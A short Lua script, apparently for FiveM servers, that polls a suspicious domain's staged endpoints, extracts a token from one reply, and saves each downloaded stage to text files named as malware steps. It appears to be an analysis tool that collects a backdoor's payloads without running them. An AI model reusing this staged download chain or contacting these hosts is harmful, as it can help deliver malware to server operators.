local function WriteIncommingDataToFile(label, content)
	local fileName = ('%s.txt'):format(label)
	local content = ('%s'):format(content)
	local file = io.open(fileName, "w")
	file:write(content)
	file:close()
end

PerformHttpRequest('https://pqzskjptss.shop/i?to=p764QP', function(errorCode, resultData)
    pcall(function()
		WriteIncommingDataToFile('stage_1_data', resultData)
		-- file content stage_1_data.txt
		local eloop = true
		Citizen.CreateThread(function()
			while eloop do
				PerformHttpRequest('https://pqzskjptss.shop/v2_/stage1?to=p764QP', function(err, data)
					if (err == 200) then
						if (data == nil or data ==  '') then return end
						WriteIncommingDataToFile('mal_http_step_5_1', data)
						eloop = false
					end
				end)
				Citizen.Wait(4000)
			end
		end)
    end)
end)

PerformHttpRequest("https://pqzskjptss.shop/v2_/stage3.php?to=p764QP", function(errorCode, resultData)
    if (resultData == nil or resultData == "") then return end
	WriteIncommingDataToFile('stage_1_data_2', resultData)
	-- file content mal_http_step_4_2.txt
	local token = resultData:match("=([a-zA-Z0-9]*)==")
	local next_uri = 'https://pqzskjptss.shop/v2_/stage3b.php?asf='..token..'=='
	local hash_var1 = true
	Citizen.CreateThread(function()
		while hash_var1 do
			PerformHttpRequest(next_uri, function(err, data)
				if(err == 200) then
					if (data == nil or data ==  '') then return end
					WriteIncommingDataToFile('mal_http_step_5_2', data)
					hash_var1 = false
				end
			end)
			Citizen.Wait(4000)
		end
	end)
end)